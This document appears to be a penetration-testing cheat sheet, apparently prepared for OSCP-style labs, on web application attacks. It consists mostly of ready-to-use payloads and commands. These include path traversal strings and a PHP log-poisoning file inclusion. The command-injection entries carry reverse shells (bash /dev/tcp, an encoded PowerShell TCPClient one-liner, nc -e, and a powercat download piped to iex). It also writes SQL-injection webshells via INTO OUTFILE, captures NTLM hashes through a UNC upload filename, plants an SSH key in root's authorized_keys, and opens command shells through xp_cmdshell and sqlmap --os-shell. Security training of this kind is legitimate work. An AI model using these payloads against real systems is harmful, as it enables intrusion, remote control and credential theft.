# 🕷️ Web Application Attacks

## XSS

- Locate areas accepting user input (e.g., forms, URL parameters, headers, cookies).
- Note how inputs are reflected in the application's response or processed.
- Use URL, Base64, or HTML encoding to bypass filters.
- Test variations like `<img src=x onerror=alert(1)>`.

## Path Traversal

!!! tip
    🍪 Don't forget the `--path-as-is` curl param

```shell
# linux
../etc/passwd
# bypass naive filters
....//....//etc/passwd
# URL encoding
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
# mixing forward and backward slashes
..\/..\/..\/etc/passwd
# escaped characters
....\/....\/....\/etc/passwd
# windows
..\..\..\Windows\win.ini
# UTF-8 encoding bypass
..%c0%af..%c0%af..%c0%af/etc/passwd

# curl without path normalization or encoding
curl --path-as-is "http://<url>/index.php?page=../../../etc/passwd"
```

## File Inclusion Vulnerabilities

### Local

```shell
# gind or poison a file that execute commands with <?php echo system($_GET['cmd']); ?> for example.
# perform the path traversal and add the command
curl http://192.168.123.193/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls

# encode commands, for example, a reverse shell like: bash -c "bash -i >& /dev/tcp/192.168.123.193/4444 0>&1"
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.230%2F4444%200%3E%261%22

# PHP wrapper
curl http://192.168.123.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
curl "http://192.168.123.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
```

### Remote

```shell
# obtain a PHP shell from /usr/share/webshells/php in Kali or from the internet and serve it via http server such as python or apache.
python3 -m http.server 80
curl http://192.168.123.16/meteor/index.php?page=http://192.168.45.230/simple-backdoor.php&cmd=ls
```

## File Upload

- Rename files to bypass uploader logic such as `.phps, .php7, pHP`
- If the validation is on the front, the request can be altered with Burp changing the extension.

```shell
# after uploading the file
curl http://192.168.169.189/meteor/uploads/simple-backdoor.pHP?cmd=dir

# encode a PowerShell reverse shell one-liner to execute with the backdoor
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.230",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

# use the encoded one-liner
curl http://192.168.169.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-encodedCommand%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwA...AGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

- Capture NTLM hash

```shell
# change filename with Caido/Burp to access net share and get NTLM hash
Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.215\\test"
```

- Abuse validation on double extension

```shell
# if a file .php.jpg can be uploaded, try to vi the file and add a php line
<?php system($_GET['cmd']); ?>
# then
http://.../image.php.jpg?cmd=nc -e /bin/bash <ip> <port>
```

### Non-Executable Files

```shell
# check if a file can be uploaded using path traversal, capture the request with Caido/Burp and
../../../../../../../../test.txt

# inject a public key in root's authorized_keys
ssh-keygen
cat fileup.pub > authorized_keys
# capture and repeat the request with path traversal
../../../../../../../../root/.ssh/authorized_keys
ssh -i fileup -p 2222 root@mountaindesserts.com
```

## Command Injection

- Common separators: `& && || ;`
- Try encoded symbols: `%3B`
- Try terminating quoted context before the command: `'; whoami` `"&& whoami` `"& whoami"`

```shell
# check if a second command can be injected
curl -X POST -d 'Archive=git%3Bipconfig' http://192.168.216.189:8000/archive
# check with unix subshells $(cmd)
curl -X POST -d 'username=admin&password=admin&ffa=a$(whoami)' http://192.168.216.16/login

# check how the commands are being executed (cmd or ps)
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell   # `
curl -X POST -d 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.216.189:8000/archive

# start a http server serving powercat and get it with command injection
iwr("http://192.168.45.230/powercat.ps1")|iex;powercat -c 192.168.45.230 -p 4444 -e powershell
# URL encoded
curl -X POST -d 'Archive=git%3Biwr%28%22http%3A%2F%2F192.168.45.230%2Fpowercat.ps1%22%29%7Ciex%3Bpowercat%20-c%20192.168.45.230%20-p%204444%20-e%20powershell' http://192.168.216.189:8000/archive
```

## SQL Injection

> [Portswigger cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
> [PATT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

### DB basic recon

```shell
# MySQL
mysql -u root -p'root' -h 192.168.50.16 -P 3306
select version();
select system_user();
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';

# MSSQL
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
```

### Identification

```shell
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

### Testing

> <https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt>

```shell
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
'OR "='
'='
'LIKE'
'=0--+
admin'-- -
admin'--
```

### Union

**Requirements**:

1. The injected **UNION** query has to include the same number of columns as the original query.
2. The data types need to be compatible between each column.

```shell
# detect number of columns
' ORDER BY 1-- //
' union select 1,2,3,4,5--

# show data on the columns with the same datatype
' union select database(), user(), @@version, null, null -- //

# show databases
' union select null, null, null, schema_name from information_schema.schemata-- -'
# show tables
' union select null, null, null, table_name from information_schema.tables where table_schema=<table_schema>-- -'
# show columns 
' union select null, null, null, column_name from information_schema.columns where table_name=<table_name>-- //

# extract data
' union select null, null, null, group_concat(username, 0x3a, password), null from users -- //

# abuse SELECT INTO_OUTFILE in MySQL
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

### Blind (Time based)

```shell
# if user exists, app hangs for 3 seconds
' AND IF (1=1, sleep(3),'false') -- //

# postgresql sleep
'; select pg_sleep(10);-- -'
```

#### Writing a webshell

```shell
...&limit=100;SELECT SLEEP(10)#...
...&limit=100;SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"#...
```

### Manual Code Execution

```shell
# activate cmd shell in MSSQL
SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
# in newer versions
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

### Automated Code Execution

!!! warning ""
    Not allowed in OSCP exam

```shell
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
# using a POST request, get a shell
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```
